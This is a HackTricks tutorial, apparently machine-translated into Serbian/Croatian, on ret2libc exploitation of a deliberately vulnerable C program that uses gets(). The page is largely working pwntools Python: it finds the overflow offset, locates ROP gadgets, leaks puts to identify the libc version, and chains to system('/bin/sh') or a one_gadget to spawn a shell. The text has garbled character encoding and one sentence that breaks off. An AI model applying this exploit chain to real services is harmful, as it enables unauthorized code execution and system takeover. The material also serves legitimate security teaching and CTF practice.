<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Brzi rezime

1. **Prona캠ite** offset **prelivanja**
2. **Prona캠ite** `POP_RDI`, `PUTS_PLT` i `MAIN_PLT` gad쬰te
3. Koristite prethodne gad쬰te da **procurite adresu memorije** puts ili neke druge libc funkcije i **prona캠ete verziju libc-a** ([preuzmite je](https://libc.blukat.me))
4. Sa bibliotekom, **izra캜unajte ROP i iskoristite ga**

# Ostali tutorijali i binarni fajlovi za ve쬭anje

Ovaj tutorijal 캖e iskoristiti kod/binarni fajl koji je predlo쬰n u ovom tutorijalu: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Jo코 korisnih tutorijala: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Kod

Naziv fajla: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Curenje LIBC 코ablona

Koristi캖u kod koji se nalazi ovde da napravim eksploit.\
Preuzmite eksploit i smestite ga u isti direktorijum kao i ranjivi binarni fajl i dajte potrebne podatke skripti:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Pronala쬰nje ofseta

마blonu je potreban ofset pre nego 코to nastavi sa eksploatacijom. Ako nije pru쬰n, izvr코i캖e potreban kod za pronala쬰nje ofseta (podrazumevano `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Izvr코ite** `python template.py` otvori캖e se GDB konzola sa programom koji je pao. Unutar te **GDB konzole** izvr코ite `x/wx $rsp` da biste dobili **bajtove** koji 캖e prepisati RIP. Na kraju, dobijte **pomak** koriste캖i **python** konzolu:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Nakon pronala쬰nja ofseta (u ovom slu캜aju 40), promenite vrednost OFFSET promenljive unutar 코ablona koriste캖i tu vrednost.\
`OFFSET = "A" * 40`

Jo코 jedan na캜in je kori코캖enje: `pattern create 1000` -- _izvr코i do ret_ -- `pattern search $rsp` iz GEF.

# 2- Pronala쬰nje Gad쬰ta

Sada trebamo prona캖i ROP gad쬰te unutar binarnog fajla. Ovi ROP gad쬰ti 캖e biti korisni za pozivanje `puts` funkcije kako bismo prona코li **libc** koji se koristi, a kasnije i za **pokretanje kona캜nog napada**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` je potreban da bi se pozvala **funkcija puts**.\
`MAIN_PLT` je potreban da bi se ponovo pozvala **glavna funkcija** nakon jedne interakcije kako bi se **iskoristio** prekora캜enje **ponovo** (beskona캜ni krugovi iskori코캖avanja). **Koristi se na kraju svakog ROP-a da bi se program ponovo pozvao**.\
**POP\_RDI** je potreban da bi se **prosledio** parametar pozvanoj funkciji.

U ovom koraku nije potrebno izvr코iti ni코ta, jer 캖e pwntools prona캖i sve tokom izvr코avanja.

# 3- Pronala쬰nje LIBC biblioteke

Sada je vreme da se prona캠e koja verzija **libc** biblioteke se koristi. Da bismo to uradili, treba da **procurimo** **adresu** u memoriji funkcije `puts`, a zatim 캖emo **pretra쬴ti** u kojoj **verziji biblioteke** se nalazi ta verzija puts funkcije.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Da biste to postigli, najva쬹ija linija izvr코enog koda je:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Ovo 캖e poslati nekoliko bajtova dok nije mogu캖e **prepisivanje** **RIP**-a: `OFFSET`.\
Zatim 캖e postaviti **adresu** gadgeta `POP_RDI` tako da 캖e slede캖a adresa (`FUNC_GOT`) biti sa캜uvana u registru **RDI**. To je zato 코to 쬰limo da **pozovemo puts** i prosledimo mu **adresu** `PUTS_GOT` kao adresu u memoriji puts funkcije koja je sa캜uvana na adresi koju pokazuje `PUTS_GOT`.\
Nakon toga, pozva캖e se `PUTS_PLT` (sa `PUTS_GOT` unutar registra **RDI**) tako da 캖e puts **pro캜itati sadr쬬j** unutar `PUTS_GOT` (**adresu puts funkcije u memoriji**) i **ispisati je**.\
Na kraju, ponovo se poziva **glavna funkcija** kako bismo mogli ponovo iskoristiti prekora캜enje.

Na ovaj na캜in smo **prevarili puts funkciju** da **ispise** adresu funkcije **puts** (koja se nalazi u **libc** biblioteci) u **memoriji**. Sada kada imamo tu adresu, mo쬰mo **proveriti koja verzija libc-a se koristi**.

![](<../../../.gitbook/assets/image (141).png>)

Kako **eksploati코emo** lokalni binarni fajl, **nije potrebno** utvrditi koja verzija **libc**-a se koristi (samo prona캠ite biblioteku u `/lib/x86_64-linux-gnu/libc.so.6`).\
Ali, u slu캜aju udaljenog napada, objasni캖u kako to mo쬰te prona캖i ovde:

## 3.1- Pretraga verzije libc-a (1)

Mo쬰te pretra쬴ti koja biblioteka se koristi na veb stranici: [https://libc.blukat.me/](https://libc.blukat.me)\
Tako캠e 캖e vam omogu캖iti da preuzmete otkrivenu verziju **libc**-a.

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Pretraga verzije libc-a (2)

Tako캠e mo쬰te uraditi slede캖e:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Ovo 캖e potrajati neko vreme, budite strpljivi.\
Da biste to uradili, potrebno nam je:

* Ime simbola libc-a: `puts`
* Procurena adresa libc-a: `0x7ff629878690`

Mo쬰mo zaklju캜iti koja je **libc** najverovatnije kori코캖ena.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Dobijamo 2 podudaranja (trebali biste isprobati drugo ako prvo ne radi). Preuzmite prvi:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Kopirajte libc sa `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` u na코 radni direktorijum.

## 3.3- Ostale funkcije za otkrivanje podataka
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Pronala쬰nje adrese libc biblioteke i iskori코캖avanje

U ovom trenutku trebali bismo znati koju libc biblioteku koristimo. Po코to iskori코캖avamo lokalni binarni fajl, koristi캖u samo: `/lib/x86_64-linux-gnu/libc.so.6`

Dakle, na po캜etku `template.py` fajla promenite vrednost **libc** promenljive na: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Postavite putanju do biblioteke kada je poznata`

Davanjem **putanje** do **libc biblioteke**, ostatak **iskori코캖avanja 캖e biti automatski izra캜unat**.

Unutar `get_addr` funkcije 캖e biti izra캜unata **bazna adresa libc biblioteke**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Imajte na umu da **kona캜na adresa osnovne libc biblioteke mora zavr코avati sa 00**. Ako to nije slu캜aj, mo쬯a ste otkrili neta캜nu biblioteku.
{% endhint %}

Zatim, adresa funkcije `system` i adresa stringa _"/bin/sh"_ 캖e biti **izra캜unate** na osnovu **osnovne adrese libc biblioteke** i date **libc biblioteke**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Kona캜no, priprema캖e se i slati eksploit za izvr코avanje /bin/sh:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Objasni캖emo ovaj poslednji ROP. 
Poslednji ROP (`rop1`) zavr코ava pozivom funkcije main, zatim mo쬰mo **ponovo iskoristiti** **prekora캜enje** (zato je `OFFSET` ponovo ovde). Zatim 쬰limo da pozovemo `POP_RDI` koji pokazuje na **adresu** "/bin/sh" (`BINSH`) i pozovemo funkciju **system** (`SYSTEM`) jer 캖e adresa "/bin/sh" biti prosle캠ena kao parametar. 
Na kraju, **poziva se adresa funkcije exit** tako da proces **lepo zavr코ava** i ne generi코e se nikakvo upozorenje.

**Na ovaj na캜in 캖e eksploit izvr코iti **_**/bin/sh**_** shell.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Kori코캖enje ONE\_GADGET

Tako캠e mo쬰te koristiti [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) da biste dobili shell umesto kori코캖enja **system** i **"/bin/sh". ONE\_GADGET** 캖e prona캖i unutar libc biblioteke na캜in da se dobije shell koriste캖i samo jednu **ROP adresu**. 
Me캠utim, obi캜no postoje neka ograni캜enja, naj캜e코캖a i najlak코a za izbegavanje su kao 코to je `[rsp+0x30] == NULL`. Po코to kontroli코ete vrednosti unutar **RSP**, samo treba da po코aljete jo코 nekoliko NULL vrednosti kako bi se ograni캜enje izbeglo.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT FAJL

Ovde mo쬰te prona캖i 코ablon za iskori코캖avanje ove ranjivosti:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Uobi캜ajeni problemi

## MAIN\_PLT = elf.symbols\['main'] nije prona캠en

Ako simbol "main" ne postoji, mo쬰te proveriti gde se nalazi glavni kod:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
i postavite adresu ru캜no:
```python
MAIN_PLT = 0x401080
```
## Puts nije prona캠en

Ako binarna datoteka ne koristi Puts, trebali biste provjeriti koristi li

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

Ako prona캠ete ovu **gre코ku** nakon 코to ste stvorili **sve** eksploate: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Poku코ajte **oduzeti 64 bajta od adrese "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
